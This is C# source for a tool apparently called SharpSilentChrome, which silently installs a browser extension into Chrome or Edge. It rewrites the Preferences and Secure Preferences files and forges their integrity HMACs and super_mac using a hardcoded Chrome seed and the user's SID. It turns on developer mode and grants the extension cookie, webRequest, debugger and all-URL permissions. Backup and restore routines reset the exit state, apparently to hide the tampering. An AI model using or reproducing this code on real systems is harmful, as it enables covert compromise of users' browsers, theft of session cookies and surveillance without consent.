using System;
using System.IO;
using System.Text;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using static SharpSilentChrome.HmacUtils;

namespace SharpSilentChrome
{
    static class ExtensionInstaller
    {
        static void SafeSet(JObject parent, string key, JObject defaultValue, out JObject result)
        {
            if (parent[key] is JObject obj)
                result = obj;
            else
            {
                parent[key] = defaultValue;
                result = defaultValue;
            }
        }

        public static string GetUserProfilePathFromSID(string sid)
        {
            try
            {
                string regPath = $@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}";
                object profileImagePath = Microsoft.Win32.Registry.GetValue(regPath, "ProfileImagePath", null);

                if (profileImagePath == null)
                {
                    Utils.WriteLine($"[-] Could not find profile path for SID: {sid}");
                    return null;
                }

                string userProfilePath = profileImagePath.ToString();

                Utils.WriteLine($"[+] Found user profile: {userProfilePath}");
                Utils.WriteLine("");

                return userProfilePath;
            }
            catch (Exception ex)
            {
                Utils.WriteLine($"[-] Error resolving SID {sid}: {ex.Message}");
                return null;
            }
        }

        public static void InstallExtension(string sid, string extensionPath, string extensionId, string profilePath, string browser)
        {
            var (securePrefsPath, prefsPath) = Utils.GetPrefsPaths(profilePath, browser);

            // Check if browser is supported
            if (securePrefsPath == null || prefsPath == null)
            {
                Utils.WriteLine($"[-] Cannot install extension - browser '{browser}' is not supported");
                return;
            }

            // Check if files exists 
            if (!File.Exists(securePrefsPath) || !File.Exists(prefsPath))
            {
                Utils.WriteLine($"[-] Secure Preferences or Preferences file not found: {securePrefsPath} or {prefsPath}");
                Utils.WriteLine($"[+] User may not have used {browser} yet - files will be created on first browser launch");
                return;
            }

            // Install secure preferences first 
            AddExtension(sid, extensionPath, extensionId, securePrefsPath, browser);
            Utils.WriteLine($"[+] Installed extension to Secure Preferences: {securePrefsPath}");

            // Install preferences second 
            AddExtension(sid, extensionPath, extensionId, prefsPath, browser);
            Utils.WriteLine($"[+] Installed extension to Preferences: {prefsPath}");
        }

        static void AddExtension(string sid, string extensionPath, string extensionId, string prefFilePath, string browser)
        {
            var escaped = JsonConvert.ToString(extensionPath).Trim('"');
            var template = GetExtensionTemplateJSON();
            var installTime = EncodeToInstallTime(DateTime.Now).ToString();
            var extJson = template.Replace("__EXTENSION_PATH__", escaped)
                                 .Replace("__INSTALL_TIME__", installTime);
            var dictExt = JObject.Parse(extJson);

            var content = File.ReadAllText(prefFilePath, Encoding.UTF8);
            var data = JObject.Parse(content);

            // Enable dev mode
            SafeSet(data, "extensions", new JObject(), out var ext);
            SafeSet(ext, "ui", new JObject(), out var ui);
            ui["developer_mode"] = true;

            // Set profile exit_type to Normal
            SafeSet(data, "profile", new JObject(), out var profile);
            profile["exit_type"] = "Normal";

            // Add extension settings
            SafeSet(ext, "settings", new JObject(), out var settings);
            settings[extensionId] = dictExt;

            // Seeds for different browsers
            var seed = new byte[] {};

            if (browser.ToLower() == "chrome")
            {
                seed = new byte[] {
                0xe7, 0x48, 0xf3, 0x36, 0xd8, 0x5e, 0xa5, 0xf9, 0xdc, 0xdf, 0x25, 0xd8, 0xf3, 0x47, 0xa6, 0x5b,
                0x4c, 0xdf, 0x66, 0x76, 0x00, 0xf0, 0x2d, 0xf6, 0x72, 0x4a, 0x2a, 0xf1, 0x8a, 0x21, 0x2d, 0x26,
                0xb7, 0x88, 0xa2, 0x50, 0x86, 0x91, 0x0c, 0xf3, 0xa9, 0x03, 0x13, 0x69, 0x68, 0x71, 0xf3, 0xdc,
                0x05, 0x82, 0x37, 0x30, 0xc9, 0x1d, 0xf8, 0xba, 0x5c, 0x4f, 0xd9, 0xc8, 0x84, 0xb5, 0x05, 0xa8
                };
            }
            else if (browser.ToLower() == "msedge")
            {
                seed = new byte[] { };
            }

            var path = $"extensions.settings.{extensionId}";
            // trim the last "-" of the SID to calculate HMAC 
            var mac = CalculateHMAC(dictExt, path, sid.Substring(0, sid.LastIndexOf('-')), seed);

            SafeSet(data, "protection", new JObject(), out var protection);
            SafeSet(protection, "macs", new JObject(), out var macs);
            SafeSet(macs, "extensions", new JObject(), out var extMacs);
            SafeSet(extMacs, "settings", new JObject(), out var settingsMac);
            settingsMac[extensionId] = mac;
            Utils.WriteLine($"[+] Extension HMAC: {mac}");

            var devMac = CalculateChromeDevMac(seed, sid, "extensions.ui.developer_mode", true);
            SafeSet(extMacs, "ui", new JObject(), out var uiMac);
            uiMac["developer_mode"] = devMac;
            Utils.WriteLine($"[+] Dev mode protection HMAC: {devMac}");

            // First write 
            File.WriteAllText(prefFilePath, data.ToString(Formatting.None), Encoding.UTF8);
            
            // Second write - with updated super_mac 
            var super = CalcSuperMac(prefFilePath, sid, seed);
            protection["super_mac"] = super;
            File.WriteAllText(prefFilePath, data.ToString(Formatting.None), Encoding.UTF8);
            Utils.WriteLine($"[+] Updated Super_MAC: {super}");
        }

        public static void CreateBackup(string profilePath, string browser)
        {
            var (securePrefsPath, prefsPath) = Utils.GetPrefsPaths(profilePath, browser);

            // Check if browser is supported
            if (securePrefsPath == null || prefsPath == null)
            {
                Utils.WriteLine($"[-] Cannot create backup - browser '{browser}' is not supported");
                return;
            }

            // Create backup for Secure Preferences
            if (File.Exists(securePrefsPath))
            {
                string backupPath = securePrefsPath + ".backupssc";
                try
                {
                    File.Copy(securePrefsPath, backupPath, true);
                    Utils.WriteLine($"[+] Created backup: {securePrefsPath}.backupssc");
                }
                catch (Exception ex)
                {
                    Utils.WriteLine($"[-] Failed to create backup: {ex.Message}");
                }
            }
            else
            {
                Utils.WriteLine($"[-] File not found: {securePrefsPath}");
            }

            // Create backup for Preferences
            if (File.Exists(prefsPath))
            {
                string backupPath = prefsPath + ".backupssc";
                try
                {
                    File.Copy(prefsPath, backupPath, true);
                    Utils.WriteLine($"[+] Created backup: {prefsPath}.backupssc");
                }
                catch (Exception ex)
                {
                    Utils.WriteLine($"[-] Failed to create backup: {ex.Message}");
                }
            }
            else
            {
                Utils.WriteLine($"[-] File not found: {prefsPath}");
            }
        }

        public static void RevertToBackup(string profilePath, string browser)
        {
            var (securePrefsPath, prefsPath) = Utils.GetPrefsPaths(profilePath, browser);

            // Check if browser is supported
            if (securePrefsPath == null || prefsPath == null)
            {
                Utils.WriteLine($"[-] Cannot revert backup - browser '{browser}' is not supported");
                return;
            }

            // Update and revert Secure Preferences backup
            string securePrefsBackup = securePrefsPath + ".backupssc";
            if (File.Exists(securePrefsBackup))
            {
                try
                {
                    // Update backup file with exit_type Normal
                    var content = File.ReadAllText(securePrefsBackup, Encoding.UTF8);
                    var data = JObject.Parse(content);
                    SafeSet(data, "profile", new JObject(), out var profile);
                    profile["exit_type"] = "Normal";
                    File.WriteAllText(securePrefsBackup, data.ToString(Formatting.None), Encoding.UTF8);
                    Utils.WriteLine($"[+] Updated Secure Preferences backup with exit_type Normal");
                    
                    File.Copy(securePrefsBackup, securePrefsPath, true);
                    Utils.WriteLine($"[+] Reverted Secure Preferences from backup: {securePrefsBackup}");
                }
                catch (Exception ex)
                {
                    Utils.WriteLine($"[-] Failed to revert Secure Preferences: {ex.Message}");
                }

                File.Delete(securePrefsBackup);
                Utils.WriteLine($"[+] Deleted backup: {securePrefsBackup}");
            }
            else
            {
                Utils.WriteLine($"[-] Secure Preferences backup not found: {securePrefsBackup}");
            }

            // Update and revert Preferences backup
            string prefsBackup = prefsPath + ".backupssc";
            if (File.Exists(prefsBackup))
            {
                try
                {
                    // Update backup file with exit_type Normal
                    var content = File.ReadAllText(prefsBackup, Encoding.UTF8);
                    var data = JObject.Parse(content);
                    SafeSet(data, "profile", new JObject(), out var profile);
                    profile["exit_type"] = "Normal";
                    File.WriteAllText(prefsBackup, data.ToString(Formatting.None), Encoding.UTF8);
                    Utils.WriteLine($"[+] Updated Preferences backup with exit_type Normal");
                    
                    File.Copy(prefsBackup, prefsPath, true);
                    Utils.WriteLine($"[+] Reverted Preferences from backup: {prefsBackup}");
                }
                catch (Exception ex)
                {
                    Utils.WriteLine($"[-] Failed to revert Preferences: {ex.Message}");
                }

                File.Delete(prefsBackup);
                Utils.WriteLine($"[+] Deleted backup: {prefsBackup}");
            }
            else
            {
                Utils.WriteLine($"[-] Preferences backup not found: {prefsBackup}");
            }
        }

        static long EncodeToInstallTime(DateTime date)
        {
            var baseDate = new DateTime(1970, 1, 1, 0, 0, 0);
            var differenceInSeconds = (date - baseDate).TotalSeconds;
            var installTime = (long)(differenceInSeconds * 1000000) + 11644473600000000;
            return installTime;
        }

        // Update active/granted permissions and other stuffs for your needs
        static string GetExtensionTemplateJSON()
        {
            return @"{
        ""active_permissions"": {
            ""api"": [
                ""activeTab"",
                ""cookies"",
                ""webNavigation"",
                ""webRequest"",
                ""scripting"",
                ""declarativeNetRequest""
            ],
            ""explicit_host"": [
                ""<all_urls>""
            ],
            ""manifest_permissions"": [],
            ""scriptable_host"": []
        },
        ""commands"": {},
        ""content_settings"": [],
        ""creation_flags"": 38,
        ""filtered_service_worker_events"": {
            ""webNavigation.onCompleted"": [
                {}
            ]
        },
        ""first_install_time"": ""__INSTALL_TIME__"",
        ""from_webstore"": false,
        ""granted_permissions"": {
            ""api"": [
                ""activeTab"",
                ""cookies"",
                ""debugger"",
                ""webNavigation"",
                ""webRequest"",
                ""scripting"",
                ""declarativeNetRequest""
            ],
            ""explicit_host"": [
                ""<all_urls>""
            ],
            ""manifest_permissions"": [],
            ""scriptable_host"": []
        },
        ""incognito_content_settings"": [],
        ""incognito_preferences"": {},
        ""last_update_time"": ""__INSTALL_TIME__"",
        ""location"": 4,
        ""newAllowFileAccess"": true,
        ""path"": ""__EXTENSION_PATH__"",
        ""preferences"": {},
        ""regular_only_preferences"": {},
        ""service_worker_registration_info"": {
            ""version"": ""1.0.0""
        },
        ""serviceworkerevents"": [
            ""cookies.onChanged"",
            ""webRequest.onBeforeRequest/s1""
        ],
        ""state"": 1,
        ""was_installed_by_default"": false,
        ""was_installed_by_oem"": false,
        ""withholding_permissions"": false
        }";
        }
    }
}
